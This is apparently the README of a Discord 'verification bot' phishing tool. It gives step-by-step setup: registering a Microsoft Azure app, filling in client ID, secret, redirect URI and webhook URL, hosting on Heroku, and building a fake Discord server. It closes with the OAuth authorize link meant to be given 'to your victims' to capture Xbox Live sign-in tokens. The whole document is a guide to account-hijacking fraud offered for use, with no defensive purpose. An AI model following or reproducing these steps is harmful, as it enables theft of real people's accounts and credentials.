## Video Tutorial

[<img src="https://img.youtube.com/vi/-pa60mDnm6U/maxresdefault.jpg" width="50%">](https://www.youtube.com/watch?v=-pa60mDnm6U "Now in Android: 55")

## Written Tutorial

1. Fork this repo  
2. Make a Microsoft Azure Application Registration https://portal.azure.com/  
       - create a new app registration  
       - name it something like "Verification Bot"  
       - choose Personal Microsoft account, or a work or school account  
       - link your heruko application  
      
3. Configure in index.js  
       - you need to change: (watch video tutorial for better understanding)  
          + secret_value  
          + client_id  
          + redirect_uri  
          + webhook_url  
            
4. Host the repo you forked on heroku  
5. Set up your fake discord server  
6. Now you're done, the link you're going to be giving to your victims or putting in your verification server is "https://login.live.com/oauth20_authorize.srf?client_id=CLIENT-ID&response_type=code&redirect_uri=REDIRECT-URI&scope=XboxLive.signin+offline_access&state=NOT_NEEDED" (REPLACE CLIENT-ID and REDIRECT-URI)!!!!!
